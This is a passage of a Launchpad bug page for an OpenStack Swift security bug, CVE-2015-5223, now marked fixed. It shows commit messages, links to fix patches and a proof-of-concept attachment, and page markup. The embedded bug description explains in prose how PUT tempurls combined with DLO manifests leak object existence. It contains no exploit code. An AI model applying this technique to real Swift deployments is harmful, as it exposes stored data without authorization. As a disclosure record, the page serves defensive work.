    Related-Bug: 1453948

commit 4765189ef3f67b3f709c3141f222e15c6d89a62d
Author: Carlos Cavanna &lt;ccavanna@ca.ibm.com&gt;
Date:   Thu Jul 9 23:10:05 2015 -0400

    Improving statistics sent to Graphite.
    
    Currently, statistics are organized by command. However, it would also be
    useful to display statistics organized by policy. Different policies may be
    based on different storage properties (ie, faster disks).
    With this change, all the statistics for object timers will be sent per policy
    as well.
    Policy statistics reporting will use policy index and the name in Graphite will
    show as proxy-server.object.policy.&lt;policy-index&gt;.&lt;verb&gt;, etc.
    Updated unit tests for per-policy stat reporting and added new unit tests for
    invalid cases.
    Updated documentation in the Administrator's Guide to reflect this new
    aggregation.
    
    Change-Id: Id70491e4833791a3fb8ff385953d69018514cd9c

commit 5b01c5eadc3a13607d2581a55007700fca0b00af
Author: Bill Huber &lt;wbhuber@us.ibm.com&gt;
Date:   Fri Aug 7 16:24:28 2015 -0500

    Add unit test for container_update for unmounted device
    
    This unit test case gains coverage for container/update.py
    where a device (i.e. sda1) is not mounted and the code
    responds with a warning logger that the device is not
    mounted and continues.  Coverage increases 2% as a result.
    
    Change-Id: I33d247a930b28604093df4ade1ce7dbbd24aac54
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        <div style="float: right;">
          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/swift/+bug/1453948/+activity">See full activity log</a>
        </div>
        <div class="clearfix"></div>

        
          

          
            <div align="center" id="add-comment-login-first">
              To post a comment you must <a href="+login?comments=all">log in</a>.
            </div>
          
        
        
      

      </div><!-- class="top-portlet" -->
      </div><!--- id="maincontentsub"-->
      <div>
        <div id="duplicate-form-container"></div>
        <div id="privacy-form-container"></div>
      </div>
    </div>
            
            
          </div><!-- yui-b -->
        </div><!-- yui-main -->

        
          <div id="side-portlets" class="yui-b side">
            
      <div id="involvement" class="portlet">
        <ul class="involvement">
          <li class="single">
            <a class="sprite bugs" href="/swift/+filebug">
              Report a bug
            </a>
          </li>
        </ul>
      </div>
      <div id="privacy" class="first portlet public">
  <div id="privacy-text">
     <span id="information-type-summary" class="sprite public">This report contains
         <strong id="information-type">Public Security</strong>
         information
     </span>&nbsp;<a class="sprite edit action-icon" id="privacy-link" href="/swift/+bug/1453948/+secrecy">Edit</a>

     <div id="information-type-description" style="padding-top: 5px">Everyone can see this security related information.
</div>
  </div>
</div>

      <div id="portlet-actions" class="portlet vertical">
  <ul id="duplicate-actions">
    <li class="sprite bug-dupe">
    <span id="mark-duplicate-text">
    <a class="menu-link-mark-dupe" href="/swift/+bug/1453948/+duplicate">Mark as duplicate</a>
    </span>
    </li>
    
    <li><a class="menu-link-createquestion sprite add" href="https://bugs.launchpad.net/swift/+bug/1453948/+create-question">Convert to a question</a></li>
    
    <li><a class="menu-link-addbranch sprite add" href="https://bugs.launchpad.net/swift/+bug/1453948/+addbranch">Link a related branch</a></li>
    <li><a class="menu-link-linktocve sprite add" href="https://bugs.launchpad.net/swift/+bug/1453948/+linkcve">Link to <abbr title="Common Vulnerabilities and Exposures Index">CVE</abbr></a></li>
    <li><a class="menu-link-unlinkcve sprite modify remove" href="https://bugs.launchpad.net/swift/+bug/1453948/+unlinkcve">Remove CVE link</a></li>
  </ul>
</div>

      

      <div class="portlet vertical" id="portlet-subscription">
  <div class="section">
    <div id="current_user_subscription" class="False">
      
        <span>You are</span>
        
        <a class="menu-link-subscription sprite modify edit" href="/swift/+bug/1453948/+subscribe">
           
           
           
           not directly subscribed to this bug's notifications.
        </a>
      
      
    </div>
    <div id="sub-unsub-spinner">Subscribing...</div>
    <ul>
      
      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/swift/+bug/1453948/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
    </ul>
  </div>
  <script type="text/javascript">
    LPJS.use('io-base', 'node',
            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
        Y.on('domready', function() {
            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
        });
    });
  </script>
</div>

      <div class="portlet vertical" id="portlet-subscribers">
  <h2>Other bug subscribers</h2>
  <div>
    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/swift/+bug/1453948/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
  </div>
  <div id="other-bug-subscribers"></div>
</div>

      

      

      
  <div class="portlet" id="portlet-patches">
    <h2>Patches</h2>
    <ul>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4418957/+files/fix-tempurl-dlo-surprise.patch">400 PUT tempurls that have a x-object-manifest header</a>
        <small>
          (<a href="/swift/+bug/1453948/+attachment/4418957">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4433373/+files/fix-tempurl-for-clayg.diff">fix-tempurl-for-clayg.diff</a>
        <small>
          (<a href="/swift/+bug/1453948/+attachment/4433373">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4433396/+files/fix-patch-for-kota.patch">fix-patch-for-kota.patch</a>
        <small>
          (<a href="/swift/+bug/1453948/+attachment/4433396">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4435635/+files/tempurl.patch">tempurl.patch</a>
        <small>
          (<a href="/swift/+bug/1453948/+attachment/4435635">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4435840/+files/juno-tempurl-bp.patch">juno-tempurl-bp.patch</a>
        <small>
          (<a href="/swift/+bug/1453948/+attachment/4435840">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4435842/+files/kilo-tempurl-bp.patch">kilo-tempurl-bp.patch</a>
        <small>
          (<a href="/swift/+bug/1453948/+attachment/4435842">edit</a>)
        </small>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/swift/+bug/1453948/+addcomment?field.patch=on">Add patch</a>
      </li>
    </ul>
  </div>
  <div class="portlet" id="portlet-attachments">
    <h2>Bug attachments</h2>
    <ul>
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4395824/+files/put-tempurl-dlo-leak.patch">show how to use any PUT tempurl to probe for object/container existance</a>
        <small>
          (<a href="/swift/+bug/1453948/+attachment/4395824">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4439702/+files/anc-tempurl-dlo-POST-regression">anc-tempurl-dlo-POST-regression</a>
        <small>
          (<a href="/swift/+bug/1453948/+attachment/4439702">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4439705/+files/anc-tempurl-dlo-POST-test">anc-tempurl-dlo-POST-test</a>
        <small>
          (<a href="/swift/+bug/1453948/+attachment/4439705">edit</a>)
        </small>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/swift/+bug/1453948/+addcomment">Add attachment</a>
      </li>
    </ul>
  </div>


      

    
          </div><!-- yui-b side -->
        
      </div><!-- yui-t4 -->

      
  <div id="footer" class="footer">
    <div class="lp-arcana">
        <div class="lp-branding">
          <a href="https://launchpad.net/"><img src="/@@/launchpad-logo-and-name-hierarchy.png" alt="Launchpad" /></a>
          &nbsp;&bull;&nbsp;
          <a href="https://launchpad.net/+tour">Take the tour</a>
          &nbsp;&bull;&nbsp;
          <a href="https://help.launchpad.net/">Read the guide</a>
          &nbsp;
          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
            <input type="search" id="search-text" name="field.text" />
            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
          </form>
        </div>
        
  

    </div>

    <div class="colophon">
      &copy; 2004-2021
      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
      &nbsp;&bull;&nbsp;
      <a href="https://launchpad.net/legal">Terms of use</a>
      &nbsp;&bull;&nbsp;
      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
      &nbsp;&bull;&nbsp;
      <a href="/feedback">Contact Launchpad Support</a>
      
      &nbsp;&bull;&nbsp;
      <a href="http://blog.launchpad.net/">Blog</a>
      
	&nbsp;&bull;&nbsp;
	<a href="https://canonical.com/careers">Careers</a>
      
      &nbsp;&bull;&nbsp;
      <a href="https://twitter.com/launchpadstatus">System status</a>
      <span id="lp-version">
      &nbsp;&bull;&nbsp;
        r0d8de2b
        
        
        (<a href="https://dev.launchpad.net/">Get the code!</a>)
      </span>
    </div>
  </div>

    </div><!-- yui-d0-->

    
  
  
  <script id="json-cache-script">LP.cache = {"initial_comment_batch_offset": 41, "first visible_recent_comment": -1, "related_features": {}, "subscribers_portlet_url_data": {"web_link": "https://bugs.launchpad.net/bugs/1453948", "self_link": "https://bugs.launchpad.net/api/devel/bugs/1453948"}, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/1453948", "web_link": "https://bugs.launchpad.net/bugs/1453948", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 1453948, "private": false, "information_type": "Public Security", "name": null, "title": "[OSSA 2015-016] all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)", "description": "If you get a PUT tempurl you can use DLO's to find objects in the container, or in the account.\n\nIf you are allowed to upload a DLO via PUT tempurl and the application that generated the tempurl believes it safe to generate a GET tempurl for the data they just authorized you to upload - they may accidentally authorize you to download any previously discovered data.\n\nWe should not allow uses to PUT DLO's via tempurl - it's currently insecure because of the existence leak attack; and can be difficult to reason about safely for application authors generating tempurls.", "owner_link": "https://bugs.launchpad.net/api/devel/~clay-gerrard", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1453948/bug_tasks", "duplicate_of_link": null, "date_created": "2015-05-11T20:25:31.077753+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1453948/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1453948/subscriptions", "date_last_updated": "2015-09-21T23:08:56.724707+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 264, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1453948/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1453948/cves", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1453948/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1453948/attachments", "security_related": true, "latest_patch_uploaded": "2015-07-29T17:29:47.058865+00:00", "tags": ["in-feature-crypto", "in-feature-hummingbird", "in-stable-juno", "in-stable-kilo"], "date_last_message": "2015-09-21T23:08:55.982577+00:00", "number_of_duplicates": 0, "message_count": 40, "users_affected_count": 1, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1453948/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1453948/users_unaffected", "users_affected_count_with_dupes": 1, "other_users_affected_count_with_dupes": 1, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1453948/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1453948/messages", "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1453948/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1453948/linked_merge_proposals", "http_etag": "\"ef511f0a4f1c0a4807361a45deb85ab80a817395-b6755ae50f3c0748b7aa11d0a66dfa4d527d71f7\""}, "bugtask_data": {"1840896": {"milestone_widget_items": "[]", "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/swift/+bug/1453948/+delete", "user_can_edit_status": true, "bugtask_path": "/swift/+bug/1453948", "row_id": "tasksummary1840896", "importance_value": "Critical", "importance_widget_items": "[]", "id": 1840896, "user_can_delete": false, "targetname": "OpenStack Object Storage (swift)", "user_can_edit_importance": false, "assignee_vocabulary_filters": [], "bug_title": "[OSSA 2015-016] all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)", "assignee_value": null, "hide_assignee_team_selection": true, "user_can_edit_assignee": false, "form_row_id": "task1840896", "target_is_product": true, "assignee_is_team": null, "status_value": "Fix Released", "user_can_unassign": false, "milestone_value": "https://bugs.launchpad.net/api/devel/swift/+milestone/2.4.0", "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_milestone": false, "prefix": "swift"}, "1840975": {"milestone_widget_items": "[]", "status_widget_items": "[]", "delete_link": "https://bugs.launchpad.net/ossa/+bug/1453948/+delete", "user_can_edit_status": true, "bugtask_path": "/ossa/+bug/1453948", "row_id": "tasksummary1840975", "importance_value": "Medium", "importance_widget_items": "[]", "id": 1840975, "user_can_delete": false, "targetname": "OpenStack Security Advisory", "user_can_edit_importance": false, "assignee_vocabulary_filters": [], "bug_title": "[OSSA 2015-016] all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)", "assignee_value": "tristan-cacqueray", "hide_assignee_team_selection": true, "user_can_edit_assignee": false, "form_row_id": "task1840975", "target_is_product": true, "assignee_is_team": false, "status_value": "Fix Released", "user_can_unassign": false, "milestone_value": null, "assignee_vocabulary": "AllUserTeamsParticipation", "user_can_edit_milestone": false, "prefix": "ossa"}}, "bug_is_private": false, "context": {"self_link": "https://bugs.launchpad.net/api/devel/swift/+bug/1453948", "web_link": "https://bugs.launchpad.net/swift/+bug/1453948", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/1453948", "milestone_link": "https://bugs.launchpad.net/api/devel/swift/+milestone/2.4.0", "status": "Fix Released", "importance": "Critical", "assignee_link": null, "bug_target_display_name": "OpenStack Object Storage (swift)", "bug_target_name": "swift", "bug_watch_link": null, "date_assigned": null, "date_created": "2015-05-11T20:25:31.077753+00:00", "date_confirmed": "2015-06-12T23:50:18.156360+00:00", "date_incomplete": null, "date_in_progress": "2015-08-27T10:26:31.406076+00:00", "date_closed": "2015-09-01T12:25:25.093602+00:00", "date_left_new": "2015-06-12T23:50:18.156360+00:00", "date_triaged": "2015-08-27T10:26:31.406076+00:00", "date_fix_committed": "2015-08-27T10:26:31.406076+00:00", "date_fix_released": "2015-09-01T12:25:25.093602+00:00", "date_left_closed": null, "owner_link": "https://bugs.launchpad.net/api/devel/~clay-gerrard", "target_link": "https://bugs.launchpad.net/api/devel/swift", "title": "Bug #1453948 in OpenStack Object Storage (swift): \"[OSSA 2015-016] all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/swift/+bug/1453948/related_tasks", "is_complete": true, "http_etag": "\"780ac1a205cee9f4daa367fc3b5d5ec05da86cfa-ed3eda0929455438fedd34f5f3ab3b2594c635fb\""}, "information_type_data": {"PUBLIC": {"value": "PUBLIC", "is_private": false, "order": 0, "name": "Public", "description": "Everyone can see this information.\n", "description_css_class": "choice-description"}, "PRIVATESECURITY": {"value": "PRIVATESECURITY", "is_private": true, "order": 2, "name": "Private Security", "description": "Only the security group can see this information.\n ", "description_css_class": "choice-description"}, "USERDATA": {"value": "USERDATA", "is_private": true, "order": 3, "name": "Private", "description": "Only shared with users permitted to see private user information.\n", "description_css_class": "choice-description"}, "PUBLICSECURITY": {"value": "PUBLICSECURITY", "is_private": false, "order": 1, "name": "Public Security", "description": "Everyone can see this security related information.\n", "description_css_class": "choice-description"}}, "total_comments_and_activity": 75};</script>

    
  

    
  </body>


  <!--
    Facet name: bugs
    Page type: main_side
    Has global search: True
    Has application tabs: True
    Has side portlets: True

    At least 59 queries/external actions issued in 0.90 seconds

    Features: {'bugs.nominations.bug_supervisors_can_target': 'on', 'hard_timeout': '9000', 'visible_render_time': None, 'bugs.affected_count_includes_dupes.disabled': None, 'app.mainsite_only.canonical_url': None, 'app.maintenance_message': None, 'js.yui_version': None, 'disclosure.dsp_picker.enabled': 'on', 'profiling.enabled': None, 'baselayout.careers_link.disabled': None}

    r0d8de2b

    -->

</html>

